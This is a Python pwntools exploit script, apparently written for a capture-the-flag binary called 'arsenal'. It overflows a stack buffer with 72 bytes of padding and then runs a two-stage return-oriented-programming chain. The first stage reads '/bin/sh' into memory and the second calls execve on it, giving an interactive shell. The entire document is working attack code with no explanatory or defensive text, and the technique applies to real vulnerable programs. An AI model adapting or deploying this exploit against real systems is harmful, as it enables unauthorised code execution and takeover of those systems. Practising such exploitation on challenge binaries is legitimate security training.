from pwn import *

elf=ELF('./arsenal',checksec=False) 

p=process(elf.path)

context.log_level='debug'

offset = 72 
# rdi,rsi,rdx,rax

ret=elf.sym.ret_gadget

p.recvuntil(b"[arsenal] The armory is open -- pick your weapons:\n")

payload = flat(
    b"A" * offset,

    # stage 1: read(0, armory, 8)
    p64(elf.sym.pop_rdi_ret), p64(0),
    p64(elf.sym.pop_rsi_ret), p64(elf.sym.armory),
    p64(elf.sym.pop_rdx_ret), p64(8),
    p64(elf.sym.pop_rax_ret), p64(0),
    p64(elf.sym.syscall_ret),

    # stage 2: execve(armory, 0, 0)
    p64(elf.sym.pop_rdi_ret), p64(elf.sym.armory),
    p64(elf.sym.pop_rsi_ret), p64(0),
    p64(elf.sym.pop_rdx_ret), p64(0),
    p64(elf.sym.pop_rax_ret), p64(59),
    p64(elf.sym.syscall_ret)
)
p.send(payload)
# p.recvline()
p.sendline(b'/bin/sh\x00')

p.interactive()
